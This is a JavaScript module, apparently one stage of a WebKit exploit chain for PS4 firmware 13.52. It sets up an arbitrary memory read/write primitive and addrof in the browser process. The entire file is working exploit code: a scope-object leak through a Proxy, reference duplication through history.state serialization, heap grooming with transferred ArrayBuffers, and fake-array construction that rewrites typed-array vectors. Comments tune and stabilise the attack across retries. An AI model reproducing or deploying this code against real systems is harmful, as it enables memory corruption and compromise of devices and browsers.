/* ============================================================
 *  core.mjs — WebKit userland R/W primitive for PS4 FW 13.52
 *
 *  v3 changes:
 *   · CARRIER_SLOTS 4.5M → 500K (carrier butterfly: 36 MB → 3.2 MB)
 *   · explicit _resetAttempt() between retries so failed attempts
 *     don't accumulate heap across the loop
 *   · exports releaseGrooming() so the caller can hand back
 *     ~12 MB before it needs the payload buffer
 * ============================================================ */

const QS = new URLSearchParams(location.search);

const K                = 2;
const DUPLICATE_INDEX  = 2;
const CONTROL_INDEX    = 0xffff;
const CONTROL_INT      = -64000;
const FILLER_BIGINTS   = K - 1;
const FILLER_OBJECTS   = 0xfffe - K;
const EXPECTED_LENGTH  = 0x50001;
const CELL_BYTES       = 0x30;

/* Tunable from the URL: ?slots=500000 */
const CARRIER_SLOTS = (function () {
    const n = parseInt(QS.get("slots") || "500000", 10);
    return isFinite(n) && n >= 100000 && n <= 4500000 ? n : 500000;
})();

const CAPTURE_DELAY_MS = 3000;

const DRAIN_SIZE          = 0x10000;
const SLAB_SIZE           = 0x400000;
const BUTTERFLY_HOLE_SIZE = 0x81000;
const SEPARATOR_SIZE      = 0x10000;
const EARLY_HOLE_SIZE     = 0x70000;
const GUARD_SIZE          = 0x90000;
const PREDECESSOR_SIZE    = 0x80000;
const FINAL_HOLE_SIZE     = 0x80000;
const DRAIN_COUNT         = 128;

/* ── state ────────────────────────────────────────────────────── */
let _rwBuffer = null, _rwView = null, _rwMirror = null;
let _targetBuffer = null, _targetView = null;
let _fakeHost = null, _lengthWord = null;
let _fillerGraph = null, _outerGraph = null;
let _leakedScope = null, _getterCarrier = null, _preparedSymbol = null;
let _capturedString = null, _capturedWords = null;
let _copiedLength = 0, _captureState = 0, _captureError = null;
let _hostAddress = 0n, _fakeAddress = 0n;
let _keepAlive = null, _keepIndex = 0, _predecessorWords = null;
let _targetAddress = 0n, _targetAddressLow = 0, _targetAddressHigh = 0;

const _rwHeader     = new Uint8Array(CELL_BYTES);
const _targetHeader = new Uint8Array(CELL_BYTES);
const _scratchBits  = new ArrayBuffer(8);
const _scratchBytes = new Uint8Array(_scratchBits);
const _scratchWords = new Uint32Array(_scratchBits);
const _scratchDouble = new Float64Array(_scratchBits);

let _rwOriginalVector = 0n, _targetVector = 0n;
let _rwHeaderOK = false, _targetHeaderOK = false;
let _readObserved = false, _writeObserved = false, _restoreObserved = false;

let _globalFakeArray = null;
let _carrier = null;

/* ── utilities ────────────────────────────────────────────────── */
function _hex(v) {
    if (typeof v === "bigint") return "0x" + v.toString(16);
    if (typeof v === "number") return "0x" + BigInt(v).toString(16);
    return "0x0";
}
function _buffer(size) { return new ArrayBuffer(size); }
function _uint32At(b, o) {
    return b[o] + b[o+1]*0x100 + b[o+2]*0x10000 + b[o+3]*0x1000000;
}
function _plausibleCell(v) {
    return v > 0x100000000n && v <= 0xffffffffffffn && v % 8n === 0n;
}
function _pointerFromWords(words, off) {
    if (words[off+3] !== 0) return 0n;
    return BigInt(words[off])
         + BigInt(words[off+1]) * 0x10000n
         + BigInt(words[off+2]) * 0x100000000n;
}
function _encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

/* ── heap hygiene between attempts ────────────────────────────
 * Every failed attempt leaves behind:
 *   _getterCarrier (a function with CARRIER_SLOTS indexed props)
 *   _fillerGraph   (~65535 objects)
 *   _keepAlive     (~128 × 64 KB buffers)
 *   _predecessorWords (a Uint32Array over an 0x80000 buffer)
 *   _preparedSymbol, _leakedScope, _capturedString
 * If GC doesn't fire between attempts, these stack up. We null
 * every reference and clear the history entry that holds the
 * serialized graph.
 * ──────────────────────────────────────────────────────────── */
function _resetAttempt() {
    try { history.replaceState(null, ""); } catch (_) {}

    _getterCarrier    = null;
    _preparedSymbol   = null;
    _capturedString   = null;
    _capturedWords    = null;
    _leakedScope      = null;
    _fillerGraph      = null;
    _outerGraph       = null;
    _keepAlive        = null;
    _predecessorWords = null;
    _fakeHost         = null;
    _lengthWord       = null;
    _rwBuffer         = null;
    _rwView           = null;
    _rwMirror         = null;
    _targetBuffer     = null;
    _targetView       = null;
    _captureState     = 0;
    _captureError     = null;
    _copiedLength     = 0;
    _rwHeaderOK       = false;
    _targetHeaderOK   = false;
    _readObserved     = false;
    _writeObserved    = false;
    _restoreObserved  = false;
    _hostAddress      = 0n;
    _fakeAddress      = 0n;
    _targetAddress    = 0n;
    _targetAddressLow = 0;
    _targetAddressHigh= 0;
}

/* ── scope leak ─────────────────────────────────────────────── */
function _leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (t, p, r) { return r; }
    });
    const leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function _prepareSymbolWrapper(F) {
    _leakedScope = _leakScopeObject();
    if (_leakedScope == null) throw new Error("scope-not-leaked");
    for (let i = 0; i < 512; i++) _leakedScope["p" + i] = i;
    for (let j = 0; j < 8; j++) _leakedScope[j] = 1.1 * j;
    Object.defineProperty(_leakedScope, "g", { get: F, configurable: true });
    return Object(_leakedScope.g);
}

/* ── fake host ──────────────────────────────────────────────── */
function _buildFakeHost() {
    _rwBuffer = new ArrayBuffer(0x100);
    _rwView = new Uint8Array(_rwBuffer);
    _rwMirror = new Uint8Array(_rwBuffer);
    _rwMirror[0] = 0x3c;

    _targetBuffer = new ArrayBuffer(0x20);
    _targetView = new Uint8Array(_targetBuffer);
    _targetView[0] = 0xa5;
    _lengthWord = { keep: 0x51515151 };

    _fakeHost = {
        q0: _encodedHeaderNumber(),
        q1: 1.1, q2: _rwView, q3: _lengthWord, q4: 2.2, q5: 3.3
    };
    delete _fakeHost.q1;
    delete _fakeHost.q4;
    delete _fakeHost.q5;

    if (!isFinite(_fakeHost.q0) || _fakeHost.q2 !== _rwView
        || _fakeHost.q3 !== _lengthWord
        || _rwView[0] !== 0x3c || _targetView[0] !== 0xa5)
        throw new Error("fake-host-shape-failed");
}

function _buildAndStoreGraph(referenceTarget) {
    _buildFakeHost();
    _fillerGraph = new Array(0xfffd);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < FILLER_BIGINTS; ++b)
        _fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < FILLER_OBJECTS; ++o)
        _fillerGraph[pos++] = {};

    _outerGraph = new Array(CONTROL_INDEX + 1);
    _outerGraph[0] = _fillerGraph;
    _outerGraph[1] = referenceTarget;
    _outerGraph[2] = referenceTarget;
    _outerGraph[CONTROL_INDEX] = CONTROL_INT;
    history.replaceState(_outerGraph, "");
}

/* ── addrof capture ─────────────────────────────────────────── */
function _prepareAddrof() {
    _capturedWords = new Uint16Array(16);
    _getterCarrier = function getterCarrierFunction() { return 7; };
    _getterCarrier[0] = _fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++) _getterCarrier[i] = 0;
    _getterCarrier[1] = _targetView;
    _getterCarrier[2] = _fakeHost;
    _getterCarrier[3] = _targetView;
    _preparedSymbol = _prepareSymbolWrapper(_getterCarrier);
}

function _runAddrofCapture() {
    try {
        _capturedString = Symbol.prototype.toString.call(_preparedSymbol);
        _copiedLength = _capturedString.length;
        for (let i = 0; i < 16; i++)
            _capturedWords[i] = _capturedString.charCodeAt(7 + i);
        _captureState = 1;
    } catch (e) { _captureError = e; _captureState = -1; }
}

/* ── predecessor fill ──────────────────────────────────────── */
function _fillRawCellPointers(backing, pointer) {
    const hi = Number(pointer >> 32n);
    const lo = Number(pointer & 0xffffffffn);
    if (!_plausibleCell(pointer) || hi < 0 || hi > 0xffff
        || lo < 0 || lo > 0xffffffff)
        throw new Error("invalid-low48-fake-address");

    _predecessorWords = new Uint32Array(backing);
    for (let i = 0; i < _predecessorWords.length; i += 2) {
        _predecessorWords[i] = lo;
        _predecessorWords[i + 1] = hi;
    }
    const last = _predecessorWords.length - 2;
    if (_predecessorWords[0] !== lo || _predecessorWords[1] !== hi
        || _predecessorWords[last] !== lo
        || _predecessorWords[last + 1] !== hi)
        throw new Error("pointer-fill-verification-failed");
}

function _clearPredecessor() {
    if (_predecessorWords !== null) _predecessorWords.fill(0);
}

/* ── critical load ─────────────────────────────────────────── */
function _loadHistoryCritical() {
    let result = null, candidate = null;
    let rwHeaderCaptured = false, rwVectorTouched = false;

    try {
        result = history.state;
        if (!result || result.length !== EXPECTED_LENGTH) {
            if (result) result[DUPLICATE_INDEX] = undefined;
            _clearPredecessor();
            return { ok: false, reason: "length-mismatch" };
        }
        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            _clearPredecessor();
            return { ok: false, reason: "clone-miss" };
        }

        candidate = result[DUPLICATE_INDEX];
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        for (let i = 0; i < CELL_BYTES; ++i) _rwHeader[i] = candidate[i];
        rwHeaderCaptured = true;

        const rwSID = _uint32At(_rwHeader, 0);
        const rwHeaderHigh = _uint32At(_rwHeader, 4);
        const rwButterfly = _rwHeader[8] + _rwHeader[9]*0x100
            + _rwHeader[10]*0x10000 + _rwHeader[11]*0x1000000
            + _rwHeader[12]*0x100000000 + _rwHeader[13]*0x10000000000;
        const rwVectorLow = _uint32At(_rwHeader, 0x10);
        const rwVectorHigh = _rwHeader[0x14] + _rwHeader[0x15]*0x100;
        _rwOriginalVector = BigInt(rwVectorLow)
            + BigInt(rwVectorHigh)*0x100000000n;

        let rwOffsetZero = true;
        for (let rz = 0x20; rz < 0x28; ++rz)
            if (_rwHeader[rz] !== 0) rwOffsetZero = false;

        _rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
            && (rwSID & 0xf) === 0
            && _rwHeader[4] === 0 && _rwHeader[5] === 0x28
            && _rwHeader[6] === 0x08
            && (_rwHeader[7] === 0 || _rwHeader[7] === 1)
            && _rwHeader[0x0e] === 0 && _rwHeader[0x0f] === 0
            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
            && _rwHeader[0x16] === 0 && _rwHeader[0x17] === 0
            && _rwOriginalVector > 0x100000000n
            && _rwOriginalVector % 8n === 0n
            && _rwHeader[0x18] === 0 && _rwHeader[0x19] === 1
            && _rwHeader[0x1a] === 0 && _rwHeader[0x1b] === 0
            && _rwHeader[0x1c] === 0 && _rwHeader[0x1d] === 0
            && _rwHeader[0x1e] === 0 && _rwHeader[0x1f] === 0
            && rwOffsetZero && _rwHeader[0x28] === 0x58;

        if (!_rwHeaderOK) {
            candidate = null; _clearPredecessor();
            return { ok: false, reason: "rw-header-mismatch" };
        }

        _scratchWords[0] = rwSID;
        _scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
        const upgraded = _scratchDouble[0];
        if (!isFinite(upgraded)) {
            candidate = null; _clearPredecessor();
            return { ok: false, reason: "header-upgrade-fail" };
        }
        _fakeHost.q0 = upgraded;

        _scratchWords[0] = _targetAddressLow;
        _scratchWords[1] = _targetAddressHigh;
        rwVectorTouched = true;
        for (let w = 0; w < 8; ++w) candidate[0x10 + w] = _scratchBytes[w];

        for (let j = 0; j < CELL_BYTES; ++j) _targetHeader[j] = _rwView[j];

        const targetSID = _uint32At(_targetHeader, 0);
        const targetVectorLow = _uint32At(_targetHeader, 0x10);
        const targetVectorHigh = _targetHeader[0x14] + _targetHeader[0x15]*0x100;
        _targetVector = BigInt(targetVectorLow)
            + BigInt(targetVectorHigh)*0x100000000n;

        let targetOffsetZero = true;
        for (let tz = 0x20; tz < 0x28; ++tz)
            if (_targetHeader[tz] !== 0) targetOffsetZero = false;

        _targetHeaderOK = targetSID === rwSID
            && _targetHeader[4] === 0 && _targetHeader[5] === 0x28
            && _targetHeader[6] === 0x08
            && (_targetHeader[7] === 0 || _targetHeader[7] === 1)
            && _targetHeader[0x0e] === 0 && _targetHeader[0x0f] === 0
            && _targetHeader[0x16] === 0 && _targetHeader[0x17] === 0
            && _targetVector > 0x100000000n && _targetVector % 8n === 0n
            && _targetHeader[0x18] === 0x20 && _targetHeader[0x19] === 0
            && _targetHeader[0x1a] === 0 && _targetHeader[0x1b] === 0
            && _targetHeader[0x1c] === 0 && _targetHeader[0x1d] === 0
            && _targetHeader[0x1e] === 0 && _targetHeader[0x1f] === 0
            && targetOffsetZero && _targetHeader[0x28] === 0x58;

        if (!_targetHeaderOK) {
            for (let r = 0; r < 8; ++r)
                candidate[0x10 + r] = _rwHeader[0x10 + r];
            candidate = null; _clearPredecessor();
            return { ok: false, reason: "target-header-mismatch" };
        }

        _scratchWords[0] = targetVectorLow;
        _scratchWords[1] = targetVectorHigh;
        for (let w = 0; w < 8; ++w) candidate[0x10 + w] = _scratchBytes[w];

        _readObserved = _rwView[0] === 0xa5 && _targetView[0] === 0xa5;
        if (!_readObserved) {
            for (let r = 0; r < 8; ++r)
                candidate[0x10 + r] = _rwHeader[0x10 + r];
            _targetView[0] = 0xa5; _rwMirror[0] = 0x3c;
            candidate = null; _clearPredecessor();
            return { ok: false, reason: "read-verify-fail" };
        }

        _rwView[0] = 0x5a;
        _writeObserved = _rwView[0] === 0x5a && _targetView[0] === 0x5a;
        _rwView[0] = 0xa5;

        if (_readObserved && _writeObserved) _globalFakeArray = candidate;

        for (let r = 0; r < 8; ++r)
            candidate[0x10 + r] = _rwHeader[0x10 + r];
        _targetView[0] = 0xa5; _rwMirror[0] = 0x3c;
        _restoreObserved = _rwView[0] === 0x3c
            && _rwMirror[0] === 0x3c && _targetView[0] === 0xa5;

        candidate = null; _clearPredecessor();

        return {
            ok: true,
            readPass: _rwHeaderOK && _targetHeaderOK && _readObserved,
            writePass: _writeObserved && _restoreObserved
        };
    } catch (error) {
        if (result !== null) {
            try { result[DUPLICATE_INDEX] = undefined; } catch (_) {}
        }
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try {
                for (let r = 0; r < 8; ++r)
                    candidate[0x10 + r] = _rwHeader[0x10 + r];
            } catch (_) {}
        }
        try { _targetView[0] = 0xa5; } catch (_) {}
        try { _rwMirror[0] = 0x3c; } catch (_) {}
        try { _clearPredecessor(); } catch (_) {}
        return { ok: false, reason: "load-threw", error };
    }
}

function _runGroomAndLoad() {
    _keepAlive = new Array(DRAIN_COUNT + 3);
    _keepIndex = 0;

    const channel = new MessageChannel();
    channel.port1.close();
    channel.port2.close();

    for (let i = 0; i < DRAIN_COUNT; ++i)
        _keepAlive[_keepIndex++] = _buffer(DRAIN_SIZE);

    let slab = _buffer(SLAB_SIZE);
    channel.port1.postMessage(0, [slab]);
    slab = null;

    const butterflyHole1 = _buffer(BUTTERFLY_HOLE_SIZE);
    const butterflyHole2 = _buffer(BUTTERFLY_HOLE_SIZE);
    const separator = _buffer(SEPARATOR_SIZE);
    const earlyHole = _buffer(EARLY_HOLE_SIZE);
    const guard = _buffer(GUARD_SIZE);
    const predecessor = _buffer(PREDECESSOR_SIZE);
    const finalHole = _buffer(FINAL_HOLE_SIZE);

    _fillRawCellPointers(predecessor, _fakeAddress);

    _keepAlive[_keepIndex++] = separator;
    _keepAlive[_keepIndex++] = guard;
    _keepAlive[_keepIndex++] = predecessor;

    channel.port1.postMessage(0,
        [butterflyHole1, butterflyHole2, earlyHole, finalHole]);

    return _loadHistoryCritical();
}

/* ── primitive installation ────────────────────────────────── */
function _installPrimitive() {
    function read64(addr) {
        if (!_globalFakeArray) return 0n;
        const old = [];
        for (let i = 0; i < 8; i++) old[i] = _globalFakeArray[0x10 + i];

        const a = BigInt(addr);
        for (let i = 0; i < 8; i++)
            _globalFakeArray[0x10 + i] = Number((a >> BigInt(i*8)) & 0xffn);

        let val = 0n;
        for (let i = 0; i < 8; i++)
            val |= BigInt(_globalFakeArray[i]) << BigInt(i*8);

        for (let i = 0; i < 8; i++) _globalFakeArray[0x10 + i] = old[i];
        return val;
    }

    function write64(addr, value) {
        if (!_globalFakeArray) return;
        const old = [];
        for (let i = 0; i < 8; i++) old[i] = _globalFakeArray[0x10 + i];

        const a = BigInt(addr);
        for (let i = 0; i < 8; i++)
            _globalFakeArray[0x10 + i] = Number((a >> BigInt(i*8)) & 0xffn);

        const v = BigInt(value);
        for (let i = 0; i < 8; i++)
            _globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xffn);

        for (let i = 0; i < 8; i++) _globalFakeArray[0x10 + i] = old[i];
    }

    function addrof(obj) {
        _getterCarrier[0] = obj;
        _getterCarrier[2] = obj;
        _preparedSymbol = _prepareSymbolWrapper(_getterCarrier);
        const s = Symbol.prototype.toString.call(_preparedSymbol);
        const w = new Uint16Array(16);
        for (let i = 0; i < 16; i++) w[i] = s.charCodeAt(7 + i);
        return _pointerFromWords(w, 0);
    }

    function fakeobj(addr) { return null; }

    return { read64, write64, addrof, fakeobj };
}

/* ── public cleanup hook ────────────────────────────────────
 * Called by the chain after PRIMITIVE-OK. Drops the ~12 MB of
 * grooming state that is no longer needed once we have R/W.
 * ──────────────────────────────────────────────────────────── */
export function releaseGrooming() {
    /* Keep _globalFakeArray — that is the primitive itself. */
    /* Keep _getterCarrier and _preparedSymbol — addrof still needs them. */
    /* Drop everything else. */
    _fillerGraph      = null;
    _outerGraph       = null;
    _keepAlive        = null;
    _predecessorWords = null;
    _leakedScope      = null;
    _capturedString   = null;
    _capturedWords    = null;
    /* Clear the history entry so the serialized graph is freed. */
    try { history.replaceState(null, ""); } catch (_) {}
}

/* ═══════════════════════════════════════════════════════════════
 *  PUBLIC API
 * ═══════════════════════════════════════════════════════════════ */
export async function establishPrimitive(opts = {}) {
    const maxAttempts = opts.maxAttempts || 6;
    const onEvent = opts.onEvent || (() => {});

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        /* Hard reset before every attempt — this is the fix for the
         * "two red fails then OOM" pattern. */
        _resetAttempt();

        onEvent("ATTEMPT", `starting attempt ${attempt}/${maxAttempts}`, attempt);

        try {
            const referenceTarget = {
                marker: 0x51515151, kind: "serialized-reference"
            };
            _buildAndStoreGraph(referenceTarget);
            onEvent("SSV-STORED", "duplicate-index graph stored", attempt);

            _prepareAddrof(referenceTarget);
            onEvent("ADDROF-PREP", "carrier slots=" + CARRIER_SLOTS, attempt);

            await new Promise(r => setTimeout(r, CAPTURE_DELAY_MS));
            _runAddrofCapture();

            if (_captureState !== 1) {
                onEvent("ADDROF-FAIL", "capture did not complete", attempt);
                continue;
            }

            const a0 = _pointerFromWords(_capturedWords, 0);
            const b0 = _pointerFromWords(_capturedWords, 4);
            const a1 = _pointerFromWords(_capturedWords, 8);
            const b1 = _pointerFromWords(_capturedWords, 12);

            const repeated = a0 === a1 && b0 === b1;
            const distinct = a0 !== b0;
            const plausible = _plausibleCell(a0) && _plausibleCell(b0)
                && _plausibleCell(a1) && _plausibleCell(b1);

            onEvent("ADDROF-PTRS",
                `HOST=${_hex(a0)} TARGET=${_hex(b0)}`, attempt);

            if (!repeated || !distinct || !plausible) {
                onEvent("ADDROF-BAD", "validation failed", attempt);
                continue;
            }

            _hostAddress = a0;
            _targetAddress = b0;
            _targetAddressHigh = Number(_targetAddress >> 32n);
            _targetAddressLow = Number(_targetAddress & 0xffffffffn);
            _fakeAddress = _hostAddress + 0x10n;

            if (!_plausibleCell(_fakeAddress)) {
                onEvent("FAKE-ADDR-FAIL", _hex(_fakeAddress), attempt);
                continue;
            }

            onEvent("FAKE-ADDRESS",
                `host=${_hex(_hostAddress)} fake=${_hex(_fakeAddress)}`, attempt);

            const result = _runGroomAndLoad();
            if (!result.ok) {
                onEvent("LOAD-FAIL", result.reason, attempt);
                continue;
            }
            if (!result.readPass || !result.writePass) {
                onEvent("RW-VERIFY-FAIL",
                    `read=${result.readPass} write=${result.writePass}`, attempt);
                continue;
            }

            _carrier = _installPrimitive();
            onEvent("PRIMITIVE-OK", `attempt ${attempt} succeeded`, attempt);
            return _carrier;
        } catch (error) {
            onEvent("ATTEMPT-THREW",
                String(error && error.message || error), attempt);
        }
    }
    throw new Error("establishPrimitive: all attempts failed");
}

export { _plausibleCell as plausibleCell, _hex as hex };
